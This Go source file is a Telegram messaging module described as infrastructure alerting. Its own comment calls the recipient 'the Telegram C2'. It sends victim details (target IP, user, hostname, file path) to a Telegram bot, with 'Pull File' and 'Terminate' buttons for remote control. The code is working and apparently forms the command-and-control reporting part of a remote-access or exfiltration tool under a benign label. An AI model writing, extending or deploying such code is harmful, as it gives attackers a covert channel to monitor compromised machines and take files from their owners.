// Package telegram - Advanced Telegram alerting for Soket.io V1.0 infrastructure.
package telegram

import (
	"fmt"
	"net/http"
	"net/url"
	"os"
	"time"
)

var (
	botToken string
	chatID   string
)

func init() {
	botToken = os.Getenv("PH_TELEGRAM_TOKEN")
	chatID = os.Getenv("PH_TELEGRAM_CHAT_ID")
}

// AlertData represents the structured content for a system alert.
type AlertData struct {
	EventType string
	Hostname  string
	User      string
	IP        string
	FilePath  string
	Details   string
}

// SendAlert sends a highly structured HTML report to the Telegram C2.
func SendAlert(data AlertData) error {
	if botToken == "" || chatID == "" {
		return fmt.Errorf("telegram configuration missing")
	}

	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	report := fmt.Sprintf(
		"<b>SYSTEM ALERT: [%s]</b>\n"+
			"----------------------------\n"+
			"<b>TARGET IP :</b> <code>%s</code>\n"+
			"<b>USER      :</b> <code>%s</code>\n"+
			"<b>HOSTNAME  :</b> <code>%s</code>\n"+
			"<b>ACTION    :</b> <b>%s</b>\n"+
			"<b>PATH      :</b> <code>%s</code>\n"+
			"<b>TIMESTAMP :</b> <code>%s</code>\n"+
			"----------------------------\n"+
			"<b>INFO      :</b> %s",
		data.EventType,
		data.IP,
		data.User,
		data.Hostname,
		data.EventType,
		data.FilePath,
		time.Now().Format("2006-01-02 15:04:05"),
		data.Details,
	)

	vals := url.Values{}
	vals.Set("chat_id", chatID)
	vals.Set("text", report)
	vals.Set("parse_mode", "HTML")
	vals.Set("disable_web_page_preview", "true")

	// Add Interactive Buttons
	if data.FilePath != "" && data.FilePath != "N/A" {
		keyboard := fmt.Sprintf(`{"inline_keyboard": [[{"text": "Pull File", "callback_data": "pull:%s"}, {"text": "Terminate", "callback_data": "term"}]]}`, data.FilePath)
		vals.Set("reply_markup", keyboard)
	}

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.PostForm(apiURL, vals)
	if err != nil {
		return fmt.Errorf("transport failure: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("api rejected request: %s", resp.Status)
	}

	return nil
}
